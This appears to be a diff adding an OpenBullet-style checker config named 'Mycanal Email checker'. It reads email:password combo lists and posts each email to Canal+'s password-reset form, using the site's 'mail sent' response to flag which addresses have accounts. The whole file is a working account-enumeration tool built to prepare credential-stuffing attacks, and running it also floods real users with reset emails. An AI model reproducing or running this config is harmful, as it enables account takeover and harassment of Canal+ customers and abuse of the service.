@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "Mycanal Email checker",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-27T06:52:31.3261485+00:00",
+  "AdditionalInfo": "",
+  "Author": "MadriDniniToz",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://pass.canal-plus.com/form/pwdreinit?bundle=site&ssoconf=pwdreinit_gene_gene&popin=true&socialLinksDisabled=true&pass_target=https%3A%2F%2Fclient.canal.fr%2Fcompte%3Forigref%3Dhttp%253A%252F%252Fespaceclientcanal.canal-plus.com%252Faide%252Fs-inscrire-sur-l-espace-client%252Fcid1787-j-ai-oublie-mon-mot-de-passe.html%253Fcid%253D1787%2526pid%253D792&urlSource=https%3A%2F%2Fclient.canal.fr%2Fcompte%3Forigref%3Dhttp%253A%252F%252Fespaceclientcanal.canal-plus.com%252Faide%252Fs-inscrire-sur-l-espace-client%252Fcid1787-j-ai-oublie-mon-mot-de-passe.html%253Fcid%253D1787%2526pid%253D792&omnitureChannel=Vente&distributorId=&ssoEmail=" AutoRedirect=TRUE 
+  CONTENT "ssoEmail=<USER>&submitButton=Envoyer+le+lien" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "" 
+    KEY "'pwdreinit_gene_gene'" 
+  KEYCHAIN Success OR 
+    KEY "'msg_pwdreinit_gene_mail_sent_gene'" 
